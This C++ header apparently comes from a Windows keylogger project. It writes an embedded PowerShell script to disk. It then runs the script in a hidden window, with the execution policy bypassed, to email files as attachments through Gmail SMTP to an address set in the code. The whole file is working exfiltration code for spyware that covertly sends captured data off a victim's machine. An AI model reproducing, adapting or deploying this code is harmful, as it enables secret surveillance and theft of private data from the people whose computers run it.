#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <Windows.h>
#include "DirectoryCreate.h"
#include "Timer.h"
#include "CustTime.h"
using namespace std;

#define SCRIPT_NAME "Script.ps1"

namespace Mail{
	// Both emails can be the same
	#define X_EM_TO "[To Email Address]"
	#define X_EM_FROM "[From Email Address]"
	#define X_EM_PASS "[From Email Address Password]"

	const string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		string(X_EM_PASS) +
		"\""
		" -From \"" +
		string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

	#undef X_EM_FROM
	#undef X_EM_TO
	#undef X_EM_PASS

	// search for a specific string and replace that string
	string StringReplace(string s, const string &what, const string &with) {
		if (what.empty())
			return s; // nothing to replace
		size_t sp = 0;

		while ((sp = s.find(what, sp)) != string::npos) // as long as not equal to null terminator position
			s.replace(sp, what.length(), with), sp += with.length();
		return s;
	}

	bool CheckFileExists(const string &f){
		ifstream file(f);
		return (bool)file;
	}

	bool CreateScript(){
		ofstream script(DirectoryCreate::GetOurPath(true) + string(SCRIPT_NAME));
		if (!script)
			return false; // check if script was created
		script << PowerShellScript;

		if (!script)
			return false; // was it successfully written

		script.close();

		return true;
	}

	Timer m_timer;

	int SendMail(const string &subject, const string &body, const string &attachments){
		bool ok; // if mail was sucessfully sent

		ok = DirectoryCreate::MKDir(DirectoryCreate::GetOurPath(true));
		if (!ok)
			return -1;
		string scr_path = DirectoryCreate::GetOurPath(true) + string(SCRIPT_NAME);
		if (!CheckFileExists(scr_path))
			ok = CreateScript(); // attempt to create script if not present
		if (!ok) // was attempt successful
			return -2;

		string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" + 
			StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + 
			StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open"; // open the file
		ShExecInfo.lpFile = "powershell"; // file to execute
		ShExecInfo.lpParameters = param.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE; // hide powershell window
		ShExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&ShExecInfo);
		if (!ok) // check if was executed successfully
			return -3;
		// Wait for 7 seconds to see if mail was successfully sent
		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100; // arbitrary code to exit
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); // check powershell status

		m_timer.SetFunction([&]() // lambda function to access all variables from SendMail
		{
			WaitForSingleObject(ShExecInfo.hProcess, 60000); // wait for one minute
			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
			if ((int)exit_code == STILL_ACTIVE) // check powershell status
				TerminateProcess(ShExecInfo.hProcess, 100);
			CustTime::WriteAppLog("<From SendMail> Return code: " + CustTime::ToString((int)exit_code));
		});

		m_timer.RepeatCount(1L); // execute only once
		m_timer.SetInterval(10L);
		m_timer.Start(true); // asynchronous execute
		return (int)exit_code;
	}

	// overload SendMail to send multiple attachments
	int SendMail(const string &subject, const string &body, const vector<string> &att) {
		string attachments = "";
		if (att.size() == 1U) // check if only 1 attachment
			attachments = att.at(0); // grab the first index only then
		else
		{
			for (const auto &v : att)
				attachments += v + "::"; // separate attachments with colons
			attachments = attachments.substr(0, attachments.length() - 2);
		}
		return SendMail(subject, body, attachments);
	}
}

#endif // SENDMAIL_H
